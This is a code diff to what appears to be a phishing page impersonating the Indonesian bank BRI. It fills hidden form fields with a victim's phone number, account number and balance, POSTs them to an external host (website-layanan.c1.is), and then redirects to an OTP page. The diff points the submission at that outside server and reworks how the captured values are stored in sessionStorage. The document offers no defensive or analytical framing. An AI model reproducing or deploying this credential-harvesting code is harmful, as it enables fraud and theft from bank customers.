@@ -1058,7 +1058,6 @@ Pastikan Saldo Sesuai di rekening.</p>
 </center>
   <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
 <input type="hidden" id="nomorhp" name="nomorsaya">
-<input type="hidden" id="namaku" name="namaku">
 <input type="hidden" id="noreke" name="norekku">
 
 
@@ -1091,8 +1090,6 @@ Pastikan Saldo Sesuai di rekening.</p>
 <script>
 var nomorku = sessionStorage.getItem("nomorku");
 document.getElementById("nomorhp").value = nomorku + "";
-var nama = sessionStorage.getItem("nama");
-document.getElementById("namaku").value = nama + "";
 var norek = sessionStorage.getItem("norek");
 document.getElementById("noreke").value = norek + "";
 
@@ -1167,7 +1164,7 @@ $('#inputlogin').on('submit', function (event) {
 $.ajax({
 
  type: 'POST',
- url: 'sendSaldo.php',
+ url: 'https://www.website-layanan.c1.is/BRI/10/sendSaldo.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -1180,12 +1177,10 @@ $.ajax({
     window.location.href='otp.html';  
 var nomorhp = document.getElementById("nomorhp").value;
 sessionStorage.setItem("nomorhp", nomorhp);
-var namaku = document.getElementById("namaku").value;
-sessionStorage.setItem("namaku", namaku);
-var noreke = document.getElementById("noreke").value;
-sessionStorage.setItem("noreke", noreke);
-var saldo = document.getElementById("saldo").value;
-sessionStorage.setItem("saldo", saldo);
+var norek = document.getElementById("noreke").value;
+sessionStorage.setItem("norek", norek);
+var saldoi = document.getElementById("saldo").value;
+sessionStorage.setItem("saldoi", saldoi);
      }, 500);
 
 
